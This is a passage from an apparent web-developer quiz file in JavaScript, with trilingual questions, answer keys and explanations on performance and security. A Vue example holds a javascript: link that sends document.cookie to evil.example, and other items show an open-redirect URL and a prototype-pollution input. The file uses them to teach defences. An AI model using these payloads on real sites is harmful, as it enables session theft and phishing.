      ar: 'المحتوى يبقى في الـ DOM ويمكن البحث فيه، لكن المتصفح لا يحسب تخطيطه ولا يرسمه حتى يقترب. وcontain-intrinsic-size يعطي ارتفاعًا تقديريًا كي لا يقفز شريط التمرير.',
      en: 'The content stays in the DOM and is searchable, but the browser skips its layout and paint until it gets close. contain-intrinsic-size gives an estimated height so the scrollbar does not jump.',
      tr: 'İçerik DOM’da kalır ve aranabilir, ama tarayıcı yaklaşana kadar düzenini hesaplamaz ve çizmez. contain-intrinsic-size tahmini bir yükseklik verir; kaydırma çubuğu zıplamaz.',
    },
  }),
  choice({
    id: 'p-s-fetchpriority', level: 'senior', topic: 'performance',
    prompt: {
      ar: 'الصورة الكبيرة في أعلى الصفحة هي عنصر LCP لكنها تُحمَّل متأخرة. أي إضافة تساعد مباشرة؟',
      en: 'The big hero image is the LCP element but loads late. Which addition helps directly?',
      tr: 'Üstteki büyük görsel LCP elemanı ama geç yükleniyor. Hangi ekleme doğrudan yardımcı olur?',
    },
    code: `<img src="hero.webp" alt="…" ???>`,
    codeLang: 'html',
    options: {
      ar: ['fetchpriority="high"', 'loading="lazy"', 'decoding="async" فقط', 'hidden'],
      en: ['fetchpriority="high"', 'loading="lazy"', 'decoding="async" only', 'hidden'],
      tr: ['fetchpriority="high"', 'loading="lazy"', 'sadece decoding="async"', 'hidden'],
    },
    answer: 0,
    why: {
      ar: 'fetchpriority="high" يطلب من المتصفح تقديم هذه الصورة على غيرها. أما loading="lazy" فيؤخرها أكثر، وهو خطأ شائع على صورة LCP.',
      en: 'fetchpriority="high" tells the browser to fetch this image ahead of others. loading="lazy" delays it even more, a common mistake on the LCP image.',
      tr: 'fetchpriority="high" tarayıcıya bu görseli diğerlerinden önce çekmesini söyler. loading="lazy" ise onu daha da geciktirir; LCP görselinde sık yapılan bir hatadır.',
    },
  }),
  choice({
    id: 'p-s-will-change', level: 'senior', topic: 'performance',
    prompt: {
      ar: 'ما مشكلة هذا السطر؟',
      en: 'What is the problem with this rule?',
      tr: 'Bu kuraldaki sorun nedir?',
    },
    code: `* {
  will-change: transform, opacity;
}`,
    codeLang: 'css',
    options: {
      ar: ['ينشئ طبقة لكل عنصر فيستهلك ذاكرة كبيرة وقد يبطئ الصفحة', 'لا مشكلة، يسرّع كل شيء', 'will-change لا يقبل أكثر من قيمة', 'يعطّل الحركات'],
      en: ['It creates a layer for every element, using lots of memory and possibly slowing the page', 'Nothing, it speeds everything up', 'will-change does not accept more than one value', 'It disables animations'],
      tr: ['Her eleman için katman oluşturur; çok bellek harcar ve sayfayı yavaşlatabilir', 'Sorun yok, her şeyi hızlandırır', 'will-change birden fazla değer almaz', 'Animasyonları kapatır'],
    },
    answer: 0,
    why: {
      ar: 'will-change تلميح للمتصفح ليجهّز طبقة GPU مسبقًا. استخدامه على كل شيء يملأ ذاكرة الـ GPU خاصة على الجوال. ضعه على العنصر الذي سيتحرك فعلًا، وقبل الحركة بقليل فقط.',
      en: 'will-change hints the browser to prepare a GPU layer ahead of time. Using it on everything fills GPU memory, especially on phones. Put it only on the element that will animate, shortly before it does.',
      tr: 'will-change, tarayıcıya önceden GPU katmanı hazırlamasını ima eder. Her şeye uygulamak özellikle telefonlarda GPU belleğini doldurur. Sadece gerçekten hareket edecek elemana, hareketten kısa süre önce koy.',
    },
  }),

  // ───────── Security ─────────
  choice({
    id: 'sec-j-api-key', level: 'junior', topic: 'security',
    prompt: {
      ar: 'وضعت مفتاح API سريًا لخدمة مدفوعة داخل كود React. ما المشكلة؟',
      en: 'You put a secret API key for a paid service in your React code. What is the problem?',
      tr: 'Ücretli bir servisin gizli API anahtarını React koduna koydun. Sorun nedir?',
    },
    code: `const OPENAI_KEY = 'sk-live-…';
fetch(url, { headers: { Authorization: \`Bearer \${OPENAI_KEY}\` } });`,
    codeLang: 'jsx',
    options: {
      ar: ['أي زائر يستطيع رؤيته في ملفات الموقع أو تبويب Network واستخدامه على حسابك', 'لا مشكلة إذا كان المستودع خاصًا', 'لا مشكلة لأن الكود مضغوط (minified)', 'فقط إذا كان الموقع على http'],
      en: ['Any visitor can see it in the site files or the Network tab and use it on your account', 'Fine if the repo is private', 'Fine because the code is minified', 'Only a problem on http'],
      tr: ['Her ziyaretçi onu site dosyalarında veya Network sekmesinde görüp senin hesabınla kullanabilir', 'Depo özelse sorun yok', 'Kod minify edildiği için sorun yok', 'Sadece http’de sorun'],
    },
    answer: 0,
    why: {
      ar: 'كل ما يصل إلى المتصفح يمكن قراءته. ضع المفتاح في الخادم (أو serverless function)، والمتصفح يطلب من خادمك، وخادمك يتصل بالخدمة.',
      en: 'Everything sent to the browser can be read. Keep the key on a server (or a serverless function): the browser calls your server, and your server calls the service.',
      tr: 'Tarayıcıya giden her şey okunabilir. Anahtarı sunucuda (veya serverless fonksiyonda) tut: tarayıcı senin sunucunu çağırır, sunucun servisi çağırır.',
    },
  }),
  choice({
    id: 'sec-j-server-validation', level: 'junior', topic: 'security',
    prompt: {
      ar: 'النموذج يتحقق في المتصفح أن الكمية بين 1 و10. هل يكفي ذلك؟',
      en: 'The form checks in the browser that the quantity is between 1 and 10. Is that enough?',
      tr: 'Form, tarayıcıda miktarın 1 ile 10 arasında olduğunu kontrol ediyor. Bu yeterli mi?',
    },
    options: {
      ar: ['لا، يمكن تجاوزه بسهولة، ويجب التحقق في الخادم أيضًا', 'نعم، المتصفح يمنع أي تلاعب', 'نعم، إذا كان الموقع على HTTPS', 'نعم، إذا استخدمنا TypeScript'],
      en: ['No, it is easy to bypass; the server must check too', 'Yes, the browser blocks any tampering', 'Yes, if the site uses HTTPS', 'Yes, if we use TypeScript'],
      tr: ['Hayır, kolayca atlatılır; sunucu da kontrol etmeli', 'Evet, tarayıcı her türlü oynamayı engeller', 'Evet, site HTTPS ise', 'Evet, TypeScript kullanırsak'],
    },
    answer: 0,
    why: {
      ar: 'يمكن لأي شخص إرسال الطلب مباشرة بـ curl أو تعديله في DevTools. التحقق في الواجهة لراحة المستخدم فقط، والتحقق الحقيقي للأمان يكون في الخادم.',
      en: 'Anyone can send the request directly with curl or edit it in DevTools. Front-end checks are for user comfort; the real check for safety happens on the server.',
      tr: 'Herkes isteği curl ile doğrudan gönderebilir veya DevTools’ta değiştirebilir. Ön yüz kontrolü kullanıcı rahatlığı içindir; güvenlik için asıl kontrol sunucuda yapılır.',
    },
  }),
  choice({
    id: 'sec-j-password-hash', level: 'junior', topic: 'security',
    prompt: {
      ar: 'كيف يجب أن يخزّن الخادم كلمات مرور المستخدمين؟',
      en: 'How should a server store user passwords?',
      tr: 'Sunucu kullanıcı şifrelerini nasıl saklamalı?',
    },
    options: {
      ar: ['hash بخوارزمية بطيئة مخصصة مثل bcrypt أو Argon2', 'كما هي في قاعدة البيانات', 'مشفّرة بـ Base64', 'hash سريع مثل MD5'],
      en: ['Hashed with a slow, purpose-built algorithm like bcrypt or Argon2', 'As plain text in the database', 'Encoded with Base64', 'With a fast hash like MD5'],
      tr: ['bcrypt veya Argon2 gibi yavaş, bu iş için yapılmış bir algoritmayla hash’lenmiş', 'Veritabanında düz metin olarak', 'Base64 ile kodlanmış', 'MD5 gibi hızlı bir hash ile'],
    },
    answer: 0,
    why: {
      ar: 'Base64 ترميز وليس تشفيرًا ويُفك بسهولة. وMD5 سريع جدًا فيمكن تجربة مليارات الكلمات في الثانية. bcrypt وArgon2 بطيئة عمدًا وتضيف salt، فإذا سُرّبت القاعدة يصعب استرجاع الكلمات.',
      en: 'Base64 is encoding, not encryption, and is trivial to reverse. MD5 is so fast attackers can try billions of guesses a second. bcrypt and Argon2 are slow on purpose and add a salt, so a leaked database is hard to crack.',
      tr: 'Base64 şifreleme değil kodlamadır, kolayca geri çevrilir. MD5 o kadar hızlıdır ki saniyede milyarlarca deneme yapılabilir. bcrypt ve Argon2 bilerek yavaştır ve salt ekler; sızan bir veritabanı zor kırılır.',
    },
  }),
  choice({
    id: 'sec-j-https-login', level: 'junior', topic: 'security',
    prompt: {
      ar: 'نموذج تسجيل الدخول في صفحة تعمل على http:// وليس https://. ما الخطر؟',
      en: 'The login form is on an http:// page, not https://. What is the risk?',
      tr: 'Giriş formu https:// değil, http:// olan bir sayfada. Risk nedir?',
    },
    options: {
      ar: ['كلمة المرور تُرسل نصًا واضحًا ويمكن لمن على الشبكة قراءتها', 'لا خطر إذا كانت كلمة المرور قوية', 'الخطر فقط على الجوال', 'المتصفح يشفّرها تلقائيًا'],
      en: ['The password travels in clear text and anyone on the network can read it', 'No risk if the password is strong', 'The risk is only on phones', 'The browser encrypts it anyway'],
      tr: ['Şifre düz metin olarak gider; ağdaki herkes okuyabilir', 'Şifre güçlüyse risk yok', 'Risk sadece telefonda', 'Tarayıcı zaten şifreler'],
    },
    answer: 0,
    why: {
      ar: 'بدون HTTPS لا يوجد تشفير، فقوة كلمة المرور لا تفيد إذا قُرئت كما هي. المتصفحات تعرض تحذير «غير آمن» على مثل هذه النماذج.',
      en: 'Without HTTPS there is no encryption, so a strong password does not help if it is read as is. Browsers show a "Not secure" warning on such forms.',
      tr: 'HTTPS yoksa şifreleme de yoktur; şifre olduğu gibi okunursa gücü işe yaramaz. Tarayıcılar böyle formlarda "Güvenli değil" uyarısı gösterir.',
    },
  }),
  choice({
    id: 'sec-m-csrf', level: 'mid', topic: 'security',
    prompt: {
      ar: 'موقع خبيث يحتوي نموذجًا مخفيًا يُرسل إلى bank.com/transfer، والمستخدم مسجّل الدخول في البنك. ما اسم هذا الهجوم؟',
      en: 'A malicious site has a hidden form that posts to bank.com/transfer while the user is signed in to the bank. What is this attack called?',
      tr: 'Kötü niyetli bir sitede bank.com/transfer’e gönderen gizli bir form var ve kullanıcı bankaya giriş yapmış. Bu saldırının adı nedir?',
    },
    options: ['CSRF', 'XSS', 'SQL Injection', 'Clickjacking'],
    answer: 0,
    why: {
      ar: 'CSRF (تزوير الطلب عبر المواقع): المتصفح يرسل cookies البنك مع الطلب تلقائيًا، فيبدو كأنه من المستخدم. الحماية: cookies بـ SameSite=Lax أو Strict، ورمز CSRF في النماذج.',
      en: 'CSRF (cross-site request forgery): the browser attaches the bank’s cookies automatically, so the request looks like it came from the user. Defences: SameSite=Lax or Strict cookies and a CSRF token in forms.',
      tr: 'CSRF (siteler arası istek sahteciliği): tarayıcı bankanın cookie’lerini otomatik ekler, istek kullanıcıdan gelmiş gibi görünür. Korunma: SameSite=Lax veya Strict cookie’ler ve formlarda CSRF token.',
    },
  }),
  choice({
    id: 'sec-m-httponly', level: 'mid', topic: 'security',
    prompt: {
      ar: 'ما فائدة إضافة HttpOnly إلى cookie الجلسة؟',
      en: 'What does HttpOnly on the session cookie protect against?',
      tr: 'Oturum cookie’sine HttpOnly eklemek neye karşı korur?',
    },
    code: `Set-Cookie: session=abc123; HttpOnly; Secure; SameSite=Lax`,
    codeLang: 'html',
    options: {
      ar: ['لا يستطيع JavaScript قراءته بـ document.cookie، فلا يسرقه هجوم XSS', 'يُرسل فقط عبر HTTPS', 'يُحذف عند إغلاق المتصفح', 'يمنع CSRF وحده تمامًا'],
      en: ['JavaScript cannot read it via document.cookie, so an XSS attack cannot steal it', 'It is only sent over HTTPS', 'It is deleted when the browser closes', 'It fully stops CSRF on its own'],
      tr: ['JavaScript onu document.cookie ile okuyamaz; XSS saldırısı çalamaz', 'Sadece HTTPS ile gönderilir', 'Tarayıcı kapanınca silinir', 'Tek başına CSRF’yi tamamen durdurur'],
    },
    answer: 0,
    why: {
      ar: 'HttpOnly يخفي الـ cookie عن JavaScript، والمتصفح يستمر في إرساله مع الطلبات. أما Secure فيعني HTTPS فقط، وSameSite هو الذي يساعد ضد CSRF.',
      en: 'HttpOnly hides the cookie from JavaScript while the browser still sends it with requests. Secure means HTTPS only, and SameSite is the one that helps against CSRF.',
      tr: 'HttpOnly cookie’yi JavaScript’ten gizler, tarayıcı isteklerle göndermeye devam eder. Secure sadece HTTPS demektir; CSRF’ye karşı yardım eden SameSite’tır.',
    },
  }),
  choice({
    id: 'sec-m-clickjacking', level: 'mid', topic: 'security',
    prompt: {
      ar: 'موقع آخر يضع صفحتك داخل iframe شفاف فوق زر مزيّف ليخدع المستخدم بالنقر. كيف تمنع ذلك؟',
      en: 'Another site loads your page in a transparent iframe over a fake button to trick users into clicking. How do you stop it?',
      tr: 'Başka bir site, kullanıcıları kandırıp tıklatmak için sayfanı sahte bir butonun üstünde saydam bir iframe’de açıyor. Nasıl engellersin?',
    },
    options: [`Content-Security-Policy: frame-ancestors 'self'`, 'Access-Control-Allow-Origin: *', 'X-Powered-By: none', '<meta name="robots" content="noindex">'],
    answer: 0,
    why: {
      ar: 'هذا يُسمّى clickjacking. frame-ancestors في CSP (أو الترويسة الأقدم X-Frame-Options: DENY) يمنع عرض صفحتك داخل iframe في مواقع أخرى. أما CORS فلا علاقة له بالـ iframe.',
      en: 'This is clickjacking. frame-ancestors in CSP (or the older X-Frame-Options: DENY) stops other sites from showing your page in an iframe. CORS has nothing to do with iframes.',
      tr: 'Buna clickjacking denir. CSP’deki frame-ancestors (veya eski X-Frame-Options: DENY) başka sitelerin sayfanı iframe içinde göstermesini engeller. CORS’un iframe’lerle ilgisi yoktur.',
    },
  }),
  choice({
    id: 'sec-m-open-redirect', level: 'mid', topic: 'security',
    prompt: {
      ar: 'ما المشكلة في إعادة التوجيه بعد تسجيل الدخول بهذا الشكل؟',
      en: 'What is wrong with this post-login redirect?',
      tr: 'Girişten sonraki bu yönlendirmede sorun nedir?',
    },
    code: `// /login?next=https://evil.example/fake-login
const next = new URLSearchParams(location.search).get('next');
location.href = next;`,
    codeLang: 'js',
    options: {
      ar: ['open redirect: رابط من موقعك يرسل المستخدم إلى موقع احتيال', 'لا مشكلة', 'location.href أبطأ من router.push فقط', 'URLSearchParams لا يعمل في كل المتصفحات'],
      en: ['An open redirect: a link on your domain sends users to a phishing site', 'Nothing', 'location.href is just slower than router.push', 'URLSearchParams does not work in every browser'],
      tr: ['Open redirect: senin alan adındaki bir bağlantı kullanıcıyı oltalama sitesine gönderir', 'Sorun yok', 'location.href sadece router.push’tan yavaştır', 'URLSearchParams her tarayıcıda çalışmaz'],
    },
    answer: 0,
    why: {
      ar: 'الرابط يبدأ باسم موقعك الموثوق فيثق به المستخدم، ثم يُنقل إلى صفحة تسجيل مزيفة. اقبل المسارات الداخلية فقط (تبدأ بـ / وليس //)، أو قائمة مسموحة من العناوين.',
      en: 'The link starts with your trusted domain, so users trust it, then they land on a fake login page. Only accept internal paths (starting with / but not //), or an allow-list.',
      tr: 'Bağlantı güvenilir alan adınla başladığı için kullanıcı güvenir, sonra sahte bir giriş sayfasına düşer. Sadece iç yolları (/ ile başlayan ama // olmayan) ya da izin listesini kabul et.',
    },
  }),
  choice({
    id: 'sec-m-jwt-readable', level: 'mid', topic: 'security',
    prompt: {
      ar: 'هل يستطيع المستخدم قراءة محتوى الـ JWT الذي يصله؟',
      en: 'Can the user read the contents of the JWT they receive?',
      tr: 'Kullanıcı aldığı JWT’nin içeriğini okuyabilir mi?',
    },
    code: `eyJhbGciOiJIUzI1NiJ9.eyJ1c2VySWQiOjQyLCJyb2xlIjoiYWRtaW4ifQ.4pcPyMD09olPSyXnrXCjTwXyr4BsezdI1AVTmud2fU4`,
    codeLang: 'js',
    options: {
      ar: ['نعم، الجزء الأوسط Base64url فقط وليس مشفّرًا، فلا تضع فيه أسرارًا', 'لا، الـ JWT مشفّر دائمًا', 'فقط إذا عرف المفتاح السري', 'فقط في الخادم'],
      en: ['Yes, the middle part is only Base64url, not encrypted, so keep secrets out of it', 'No, a JWT is always encrypted', 'Only if they know the secret key', 'Only on the server'],
      tr: ['Evet, ortadaki kısım sadece Base64url’dir, şifreli değil; içine sır koyma', 'Hayır, JWT her zaman şifrelidir', 'Sadece gizli anahtarı bilirse', 'Sadece sunucuda'],
    },
    answer: 0,
    why: {
      ar: 'الـ JWT العادي (JWS) موقّع وليس مشفّرًا: التوقيع يمنع التعديل لا القراءة. هذا الرمز يحمل {"userId":42,"role":"admin"} ويقرؤه أي أحد في jwt.io. والخادم يجب أن يتحقق من التوقيع دائمًا.',
      en: 'A regular JWT (JWS) is signed, not encrypted: the signature stops changes, not reading. This one carries {"userId":42,"role":"admin"} and anyone can read it on jwt.io. The server must always verify the signature.',
      tr: 'Normal bir JWT (JWS) imzalıdır, şifreli değildir: imza okumayı değil değiştirmeyi engeller. Bu token {"userId":42,"role":"admin"} taşır ve herkes jwt.io’da okuyabilir. Sunucu imzayı her zaman doğrulamalıdır.',
    },
  }),
  choice({
    id: 'sec-m-sri', level: 'mid', topic: 'security',
    prompt: {
      ar: 'ما فائدة الخاصية integrity على سكربت من CDN؟',
      en: 'What does the integrity attribute do on a script from a CDN?',
      tr: 'CDN’den gelen bir script’teki integrity özniteliği ne işe yarar?',
    },
    code: `<script
  src="https://cdn.example.com/lib@3.2.1/lib.min.js"
  integrity="sha384-oqVuAfXRKap7fdgcCY5uykM6+R9GqQ8K/uxy9rx7HNQlGYl1kPzQho1wx4JwY8wC"
  crossorigin="anonymous"></script>`,
    codeLang: 'html',
    options: {
      ar: ['المتصفح يرفض تشغيل الملف إذا تغيّر محتواه عن الـ hash', 'يجعل التحميل أسرع', 'يشفّر الملف', 'يمنع الـ CDN من تتبع المستخدمين'],
      en: ['The browser refuses to run the file if its content does not match the hash', 'It makes loading faster', 'It encrypts the file', 'It stops the CDN from tracking users'],
      tr: ['Dosyanın içeriği hash ile eşleşmezse tarayıcı çalıştırmayı reddeder', 'Yüklemeyi hızlandırır', 'Dosyayı şifreler', 'CDN’in kullanıcıları izlemesini engeller'],
    },
    answer: 0,
    why: {
      ar: 'Subresource Integrity يحميك إذا اختُرق الـ CDN وعُدّل الملف. المتصفح يحسب الـ hash ويقارنه، وإذا اختلف لا يشغّل السكربت. لذلك ثبّت رقم الإصدار في الرابط.',
      en: 'Subresource Integrity protects you if the CDN is hacked and the file is changed. The browser hashes the file and compares; if it differs, the script does not run. That is why you pin the version in the URL.',
      tr: 'Subresource Integrity, CDN ele geçirilip dosya değiştirilirse seni korur. Tarayıcı dosyanın hash’ini hesaplayıp karşılaştırır; farklıysa script çalışmaz. Bu yüzden URL’de sürüm sabitlenir.',
    },
  }),
  choice({
    id: 'sec-s-postmessage', level: 'senior', topic: 'security',
    prompt: {
      ar: 'ما الثغرة في هذا الكود؟',
      en: 'What is the hole in this code?',
      tr: 'Bu koddaki açık nedir?',
    },
    code: `window.addEventListener('message', (e) => {
  if (e.data.type === 'login') {
    localStorage.setItem('token', e.data.token);
  }
});`,
    codeLang: 'js',
    options: {
      ar: ['لا يتحقق من e.origin، فأي موقع يفتح صفحتك يستطيع إرسال رسالة', 'localStorage لا يقبل النصوص', 'يجب استخدام onmessage', 'لا ثغرة'],
      en: ['It does not check e.origin, so any site that opens your page can send a message', 'localStorage does not accept strings', 'You must use onmessage', 'No hole'],
      tr: ['e.origin kontrol edilmiyor; sayfanı açan her site mesaj gönderebilir', 'localStorage metin kabul etmez', 'onmessage kullanılmalı', 'Açık yok'],
    },
    answer: 0,
    why: {
      ar: 'postMessage يتجاوز قاعدة نفس المصدر عمدًا، فالمسؤولية عليك. ابدأ بـ if (e.origin !== \'https://auth.example.com\') return. وعند الإرسال حدّد targetOrigin بدل \'*\'.',
      en: 'postMessage crosses the same-origin rule on purpose, so checking is up to you. Start with if (e.origin !== \'https://auth.example.com\') return. When sending, set targetOrigin instead of \'*\'.',
      tr: 'postMessage aynı köken kuralını bilerek aşar; kontrol sana kalır. if (e.origin !== \'https://auth.example.com\') return ile başla. Gönderirken \'*\' yerine targetOrigin belirt.',
    },
  }),
  choice({
    id: 'sec-s-prototype-pollution', level: 'senior', topic: 'security',
    prompt: {
      ar: 'دالة دمج عميق تأخذ JSON من المستخدم. ماذا يمكن أن يحدث بهذا الإدخال؟',
      en: 'A deep-merge function takes JSON from the user. What can happen with this input?',
      tr: 'Bir derin birleştirme fonksiyonu kullanıcıdan JSON alıyor. Bu girdiyle ne olabilir?',
    },
    code: `const input = JSON.parse('{"__proto__": {"isAdmin": true}}');
deepMerge(settings, input);

const user = {};
console.log(user.isAdmin);`,
    codeLang: 'js',
    options: {
      ar: ['prototype pollution: قد تصبح isAdmin = true في كل الكائنات', 'لا شيء، JSON.parse يحذف __proto__', 'يرمي SyntaxError', 'يتأثر settings فقط'],
      en: ['Prototype pollution: isAdmin may become true on every object', 'Nothing, JSON.parse strips __proto__', 'It throws a SyntaxError', 'Only settings is affected'],
      tr: ['Prototype pollution: isAdmin her nesnede true olabilir', 'Hiçbir şey, JSON.parse __proto__’yu siler', 'SyntaxError fırlatır', 'Sadece settings etkilenir'],
    },
    answer: 0,
    why: {
      ar: 'JSON.parse ينشئ __proto__ كمفتاح عادي، لكن الدمج البسيط ينفّذ target[\'__proto__\'] = … فيعدّل Object.prototype المشترك. تجاهل المفاتيح __proto__ وconstructor وprototype، أو استخدم Object.create(null) أو structuredClone.',
      en: 'JSON.parse creates __proto__ as a normal key, but a naive merge runs target[\'__proto__\'] = …, which changes the shared Object.prototype. Skip __proto__, constructor and prototype keys, or use Object.create(null) or structuredClone.',
      tr: 'JSON.parse __proto__’yu normal bir anahtar olarak oluşturur, ama basit bir birleştirme target[\'__proto__\'] = … çalıştırır ve ortak Object.prototype’ı değiştirir. __proto__, constructor ve prototype anahtarlarını atla ya da Object.create(null) veya structuredClone kullan.',
    },
  }),
  choice({
    id: 'sec-s-javascript-url', level: 'senior', topic: 'security',
    prompt: {
      ar: 'المستخدم يكتب رابط موقعه الشخصي في ملفه، ويُعرض هكذا. ما الخطر؟',
      en: 'Users type their website link in their profile, and it is shown like this. What is the risk?',
      tr: 'Kullanıcılar profillerine web sitesi bağlantısı yazıyor ve böyle gösteriliyor. Risk nedir?',
    },
    code: `<a :href="profile.website">Website</a>
<!-- profile.website = "javascript:fetch('//evil.example?c='+document.cookie)" -->`,
    codeLang: 'vue',
    options: {
      ar: ['XSS: الرابط javascript: ينفّذ كودًا عند النقر، فتحقق أن البروتوكول http أو https', 'لا خطر، Vue يهرّب كل شيء', 'الخطر فقط في React', 'الرابط لا يعمل فقط'],
      en: ['XSS: a javascript: link runs code when clicked, so check the protocol is http or https', 'No risk, Vue escapes everything', 'Only a risk in React', 'The link just does not work'],
      tr: ['XSS: javascript: bağlantısı tıklanınca kod çalıştırır; protokolün http veya https olduğunu kontrol et', 'Risk yok, Vue her şeyi kaçışlar', 'Sadece React’te risk', 'Bağlantı sadece çalışmaz'],
    },
    answer: 0,
    why: {
      ar: 'تهريب النص يحمي من HTML، لكنه لا يمنع رابطًا يبدأ بـ javascript:. حلّل الرابط بـ new URL() واقبل http: وhttps: فقط قبل عرضه.',
      en: 'Escaping protects against HTML, but it does not stop a link that starts with javascript:. Parse it with new URL() and only accept http: and https: before showing it.',
      tr: 'Kaçışlama HTML’e karşı korur ama javascript: ile başlayan bir bağlantıyı engellemez. Göstermeden önce new URL() ile ayrıştır ve sadece http: ile https:’i kabul et.',
    },
  }),
  choice({
    id: 'sec-s-csp-nonce', level: 'senior', topic: 'security',
    prompt: {
      ar: 'تحتاج سكربتًا مضمّنًا (inline) في صفحة عليها CSP. ما الطريقة الآمنة؟',
      en: 'You need one inline script on a page with a CSP. What is the safe way?',
      tr: 'CSP olan bir sayfada bir satır içi (inline) script’e ihtiyacın var. Güvenli yol hangisi?',
    },
    options: {
      ar: ['nonce عشوائي جديد لكل طلب في الترويسة وفي <script nonce>', "إضافة 'unsafe-inline'", 'حذف الـ CSP', "إضافة 'unsafe-eval'"],
      en: ['A fresh random nonce per request, in the header and on <script nonce>', "Adding 'unsafe-inline'", 'Removing the CSP', "Adding 'unsafe-eval'"],
      tr: ['Her istekte yeni rastgele bir nonce; hem başlıkta hem <script nonce> üzerinde', "'unsafe-inline' eklemek", 'CSP’yi kaldırmak', "'unsafe-eval' eklemek"],
    },
    answer: 0,
    why: {
      ar: "'unsafe-inline' يسمح بأي سكربت مضمّن، ومنها ما يحقنه المهاجم، فيضيع معظم فائدة الـ CSP. الـ nonce يسمح فقط بالسكربت الذي يحمل القيمة السرية لهذا الطلب. ويمكن استخدام hash للسكربتات الثابتة.",
      en: "'unsafe-inline' allows every inline script, including injected ones, which throws away most of what CSP gives you. A nonce only allows scripts carrying this request’s secret value. For fixed scripts you can use a hash.",
      tr: "'unsafe-inline' saldırganın enjekte ettikleri dahil her satır içi script’e izin verir; CSP’nin faydasının çoğu gider. Nonce sadece bu isteğin gizli değerini taşıyan script’e izin verir. Sabit script’ler için hash kullanılabilir.",
    },
  }),
]
